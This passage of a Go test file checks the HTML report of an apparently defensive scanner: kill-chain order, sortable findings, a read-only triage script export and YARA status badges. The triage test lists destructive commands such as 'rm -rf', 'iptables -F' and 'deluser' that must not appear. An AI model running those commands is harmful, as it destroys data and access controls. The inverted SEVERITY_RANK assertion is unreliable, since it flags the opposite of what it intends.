		t.Errorf("kill-chain stages out of narrative order (initial=%d exec=%d persist=%d)", idxInitial, idxExec, idxPersist)
	}
	// Theme classes, not hard-coded presentation colors.
	if !strings.Contains(out, `[data-theme="light"] .kill-node-hit`) {
		t.Error("light theme override for kill-chain nodes missing")
	}
}

// 17. Sortable Findings Table: header cells expose data-key sort columns and
// the JS implements CSP-safe sorting with indicator updates.
func TestHTMLReport_SortableFindingsTable(t *testing.T) {
	rep, err := htmlreport.GenerateHTMLReport(sampleReportData())
	if err != nil {
		t.Fatalf("report generation failed: %v", err)
	}
	out := string(rep)

	if !strings.Contains(out, `th class="sortable" data-key="severity"`) {
		t.Error("sortable severity header missing")
	}
	for _, key := range []string{"module", "path", "rule_name", "reason", "timestamp"} {
		if !strings.Contains(out, fmt.Sprintf(`data-key="%s"`, key)) {
			t.Errorf("sortable header for %q missing", key)
		}
	}
	if !strings.Contains(out, "const SEVERITY_RANK") == false && !strings.Contains(out, "var SEVERITY_RANK") {
		t.Error("JS severity rank map missing")
	}
	if !strings.Contains(out, "function sortFindingsList") {
		t.Error("JS sort implementation missing")
	}
	if !strings.Contains(out, "function bindSortableHeaders") {
		t.Error("JS sortable header binding missing")
	}
	if !strings.Contains(out, `aria-sort="none"`) {
		t.Error("accessible aria-sort state missing on headers")
	}
	if !strings.Contains(out, `data-table th.sorted-desc .th-sort-ind`) {
		t.Error("sorted-column indicator CSS missing")
	}
}

// 18. Triage Script Export: the export produces a downloadable POSIX shell
// script that is strictly read-only (evidence gathering, no destructive ops).
func TestHTMLReport_TriageExportScript(t *testing.T) {
	rep, err := htmlreport.GenerateHTMLReport(sampleReportData())
	if err != nil {
		t.Fatalf("report generation failed: %v", err)
	}
	out := string(rep)

	if !strings.Contains(out, `id="btn-export-triage"`) {
		t.Error("triage export button missing from report toolbar")
	}
	if !strings.Contains(out, "function exportTriage") {
		t.Error("JS triage export implementation missing")
	}
	if !strings.Contains(out, "application/x-shellscript") {
		t.Error("triage script Blob MIME type missing")
	}
	if !strings.Contains(out, "'aether-triage-' + hostStr + '.sh'") {
		t.Error("triage script download filename pattern missing")
	}
	// Evidence-gathering commands must be present...
	for _, want := range []string{"sha256sum", `ls -la "$TARGET"`, "file \"$TARGET\""} {
		if !strings.Contains(out, want) {
			t.Errorf("triage script evidence command %q missing", want)
		}
	}
	// ...while destructive operations must be entirely absent.
	for _, forbidden := range []string{"rm -rf", "kill -9", "deluser", "iptables -F"} {
		if strings.Contains(out, forbidden) {
			t.Errorf("triage export must not contain destructive command %q", forbidden)
		}
	}
	// Paths must be shell-quoted to stay injection-safe.
	if !strings.Contains(out, "function shQuote") {
		t.Error("JS shell-quoting helper missing")
	}
}

func TestHTMLReport_YARAStatusAndCoverageMetrics(t *testing.T) {
	// Test 1: YARA Disabled
	dataDisabled := sampleReportData()
	dataDisabled.YARAActive = false
	dataDisabled.YARAStatus = "DISABLED (Native Heuristics Only)"
	dataDisabled.Coverage.FilesScanned = 100
	dataDisabled.Coverage.SkippedPermission = 5
	dataDisabled.FilesScanned = 100

	htmlDisabled, err := htmlreport.GenerateHTMLReport(dataDisabled)
	if err != nil {
		t.Fatalf("GenerateHTMLReport failed: %v", err)
	}
	htmlStrDisabled := string(htmlDisabled)
	if !strings.Contains(htmlStrDisabled, "badge-yara-disabled") {
		t.Errorf("expected badge-yara-disabled in report")
	}
	if !strings.Contains(htmlStrDisabled, "DISABLED (Native Heuristics Only)") {
		t.Errorf("expected YARA disabled text in report")
	}
	if !strings.Contains(htmlStrDisabled, "Audit Coverage:") {
		t.Errorf("expected Audit Coverage summary in report")
	}

	// Test 2: YARA Active
	dataActive := sampleReportData()
	dataActive.YARAActive = true
	dataActive.YARAStatus = "Active (32 rules)"
	dataActive.Coverage.FilesScanned = 1000
	dataActive.FilesScanned = 1000

	htmlActive, err := htmlreport.GenerateHTMLReport(dataActive)
	if err != nil {
		t.Fatalf("GenerateHTMLReport failed: %v", err)
	}
	htmlStrActive := string(htmlActive)
	if !strings.Contains(htmlStrActive, "badge-yara-active") {
		t.Errorf("expected badge-yara-active in report")
	}
	if !strings.Contains(htmlStrActive, "ACTIVE (Active (32 rules))") {
		t.Errorf("expected YARA active status in report")
	}
}
